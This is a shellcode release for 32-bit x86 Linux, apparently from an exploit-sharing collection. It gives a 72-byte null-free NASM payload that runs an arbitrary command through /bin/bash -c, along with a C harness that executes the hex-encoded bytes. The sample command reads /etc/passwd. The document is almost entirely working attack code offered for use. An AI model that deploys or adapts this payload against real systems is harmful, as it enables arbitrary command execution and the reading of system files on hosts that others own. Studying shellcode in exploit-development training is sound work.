/*
;author:    Filippo "zinzloun" Bersani
;date:      16/12/2016
;version:   1.0
;X86 Assembly/NASM Syntax
;tested on: Linux OpenSuse001 2.6.34-12-desktop 32bit
;           Linux ubuntu 3.13.0-100-generic #147~precise1-Ubuntu 32bit
;           Linux bb32 4.4.0-45-generic 32bit
;72 bytes
;description:
   executes arbitrary command through /bin/bash -c "command"
    a slightly different and null free version of the metasploit payload:
		https://www.rapid7.com/db/modules/payload/linux/x86/exec
	that is not null free. Crashed on 2 vm of my lab enviroment: OpenSuse001 and bb32
	so I coded this version, anyway thx 2 vlad902 for the great idea

;see comment for details

global _start

section .text
_start:

xor eax,eax			;zeroing registers
xor edx,edx
mov al,0xb			;int execve(const char *filename, char *const argv[],
                        ;        char *const envp[]);

push   edx			;null
push   word 0x632d 	;-c
mov edi,esp			;save in edi the -c value

push edx			;null
push 0x68736162		;////bin/bash
push 0x2f6e6962
push 0x2f2f2f2f

mov ebx,esp			;set first arg in ebx=*filename
push   edx			;null

jmp short push_cmd	;jump to collect the command

set_argv:
 push edi			;push -c value
 push ebx			;push ////bin/bash
 mov ecx,esp		;*argv = ////bin/bash, -c, cmd, null
 int    0x80

push_cmd:
 call set_argv
 cmd: db "cat /etc/passwd;echo do__ne"
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\xb0\x0b\x52\x66\x68\x2d\x63\x89\xe7\x52\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89"
"\xe3\x52\xeb\x06\x57\x53\x89\xe1\xcd\x80\xe8\xf5\xff\xff\xff\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x3b"
"\x65\x63\x68\x6f\x20\x64\x6f\x5f\x5f\x6e\x65";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}